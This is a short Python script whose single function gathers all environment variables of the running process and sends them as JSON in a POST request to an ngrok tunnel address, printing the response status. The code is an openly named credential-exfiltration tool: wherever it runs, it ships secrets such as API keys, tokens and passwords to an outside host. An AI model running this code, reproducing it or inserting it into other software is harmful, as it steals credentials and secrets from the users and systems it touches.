import os
import requests

def leak_env_vars():
    url = "https://7613-45-85-145-175.ngrok-free.app"  # Replace with your Ngrok URL
    env_vars = dict(os.environ)  # Convert environment variables to a dictionary
    try:
        response = requests.post(url, json=env_vars)  # Send environment variables as JSON
        print(f"Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending environment variables: {e}")

def main():
    leak_env_vars()

if __name__ == "__main__":
    main()
